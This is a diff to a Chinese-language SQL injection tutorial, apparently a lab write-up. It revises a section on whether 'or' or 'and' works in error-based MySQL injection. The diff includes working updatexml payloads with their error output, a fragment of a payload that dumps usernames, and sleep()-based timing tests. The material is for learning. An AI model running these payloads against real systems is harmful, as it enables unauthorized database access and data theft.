@@ -84,16 +84,35 @@ passwd = ' or updatexml(1,concat(0x7e,(select * from (select group_concat(userna
 
 > 💡 这个派生表绕过的技巧很实用，遇到 `ERROR 1093` 就用它。
 
-**④ 为什么用 `or` 而不是 `and`？**
+**④ `and` 还是 `or`？—— 实测两个都能用**
 
-`$passwd` 被包在 `SET password = '...'` 里，输入 `' or updatexml(...) or '` 得到：
-```sql
-SET password = '' or updatexml(...) or ''
+| payload | 实测结果 |
+|---|---|
+| `' or updatexml(1,concat(0x7e,database()),1) or '` | `XPATH syntax error: '~security'` ✓ |
+| `' and updatexml(1,concat(0x7e,database()),1) and '` | `XPATH syntax error: '~security'` ✓ |
+
+两个都成功。原因是 **`updatexml()` 的 XPath 参数必须是常量**，传列名进去会被 MySQL 直接拒绝：
+
 ```
-`''` 在布尔上下文里是**假**，所以 `or` 右边**必须求值** → `updatexml` 被执行 → 报错成功。
+?id=1' and updatexml(1,concat(0x7e,username),1)--+
+→ Only constant XPATH queries are supported
+```
 
-如果写 `and`，`'' and updatexml(...)` 因为左边已经是假，MySQL 短路求值，**updatexml 根本不会执行**。
-> 这是报错注入里非常容易踩的坑：**闭合后左边是假值，就用 `or`；左边是真值，才用 `and`。**
+既然是常量，MySQL 在**优化阶段就把它算掉了**，而优化发生在 WHERE 求值**之前**。
+所以 `and` 左边是真是假，都不影响报错触发。
+
+> ⚠️ 但**别以为 `and` 永远安全** —— 短路求值本身是真实存在的，只是管不到常量表达式：
+
+| 测试 | 耗时 | 说明 |
+|---|---|---|
+| `?id=1' and sleep(3)--+` | 3.24s | 左边为真 → 右边执行 |
+| `?id=-1' and sleep(3)--+` | 0.22s | 左边为假 → **右边被短路，根本没执行** |
+
+`sleep()` 不是常量、折叠不掉，所以老老实实遵守短路规则。
+
+**真正的规则**：
+- 报错函数里放**常量**（`database()` / `version()` / 子查询）→ 优化期就被折叠，`and`、`or` 都行
+- 放**折叠不掉**的东西（`sleep()`、依赖行的表达式）→ 左边为假时 `and` 会失效，这时必须用 `or`
 
 ---
 
